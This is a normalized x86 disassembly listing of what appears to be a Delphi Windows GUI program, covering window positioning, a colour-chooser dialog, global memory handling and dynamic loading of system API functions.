retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40cfec
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403174
inc edi
dec ebx
jne r-xdata
sub_42c164
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c195
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c19c
retn
mov eax [ rw-data ]
call sub_403174
sub_42c1a8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c1dc
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c204
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
mov eax r-xdata
mov [ rw-data ] eax
sub_42c486
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c4ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c4b4
retn
sub_42c4c8
adc al 0xc5
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax * 8 + 0x40042 ] bl
add [ eax ] al
fcom [ eax ]
inc eax
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
xchg esp eax
lds eax [ edx ]
cwde
lds eax [ edx ]
push cs
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x78 ] si
lds eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ch 0x42
add [ eax + eax ] bl
add [ eax ] al
enter 0x42c4 0x0
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
fadd st5
inc edx
add [ esi + eax * 8 ] cl
inc edx
add [ eax ] bl
mov [ edx ] 0x10
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
mov eax esi
call sub_403164
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42c59c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42c5dc
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42c634
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c659
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c660
retn
sub_42c66c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42c624
xor eax eax
push ebp
push sub_42c823
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c82a
mov eax [ rw-data ]
call sub_42c62c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42c82c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42c624
xor eax eax
push ebp
push sub_42cbdf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cbe6
mov eax [ rw-data ]
call sub_42c62c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42cf90
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42cfb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d000
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d007
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403174
call sub_42c66c
cmp [ rw-data ] 0x0
jg r-xdata
sub_42d028
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d04d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d054
retn
sub_42d060
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d085
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d08c
retn
sub_42d098
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d0bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0c4
retn
sub_42d0d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d0f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0fc
retn
sub_42d108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d12d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d134
retn
sub_42d140
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d165
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d16c
retn
sub_42d178
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d19d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d1a4
retn
sub_42d1d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d1fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d204
retn
sub_42d210
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d235
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d23c
retn
sub_42d24c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or bl dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
rol [ edx ] cl
hlt
sub_42dff0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46b708
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_467ca8
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_467ca8
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_46b40c
mov edi eax
mov eax ebx
call sub_46b3f0
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_46b3d8
mov edi eax
mov eax ebx
call sub_46b424
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42e0a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42dff0
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42e10c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4209c8
mov [ esi + 0x30 ] 0x1
push esi
push sub_42e1e8
call sub_421a58
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42e154
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420a14
test bl bl
jle r-xdata
call sub_421af0
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42e188
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_46e0fc
mov cl 0x1
sub_42e1b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4033ac
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42e1e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e212
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e280
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_4649c0
mov [ ebp - 0x14 ] eax
call sub_4648dc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42e343
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d9ec
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42e315
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e31c
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46da48
retn
sub_42e31c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e34a
mov eax [ ebp - 0x14 ]
call sub_464a74
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_4648e4
retn
sub_42e37c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e10c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ esi + 0x60 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42e3c0
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x60 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42e3f0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42e48d
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408c7c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx esi
add dl 0x41
call sub_4040d4
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4041f8
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
pop ecx
call sub_41a300
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e494
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_42e4bc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_42e55a
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
mov [ ebx ] 0xffffffff
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041f8
mov eax [ ebp - 0x10 ]
call sub_4080bc
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx esi
add dl 0x41
call sub_4040d4
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041f8
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_419c18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e561
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f10
retn
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
sub_42e57b
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_42e4bc
pop ecx
mov [ ebp - 0x68 ] 0x24
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_423584
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x11
xor eax eax
mov edx rw-data
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x5c ] ebx
inc eax
add edx 0x4
cmp al 0x5
jne r-xdata
mov ecx [ edx ]
or [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
cmp bl 0x7
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x4c ] sub_42e0a4
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx ChooseColorA
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ ebp - 0x54 ] 0x20
mov [ ebp - 0x48 ] eax
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x58 ] edx
push ebp
call sub_42e3f0
pop ecx
sub_42e64c
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_42c144
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_42b9b4
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_408588
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_408588
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_408588
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_42e740
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_4085ec
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_4085ec
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_4085c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_42e750
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_42e7bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_42c144
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_42ba5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e7c3
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_42e7cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_42e84e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
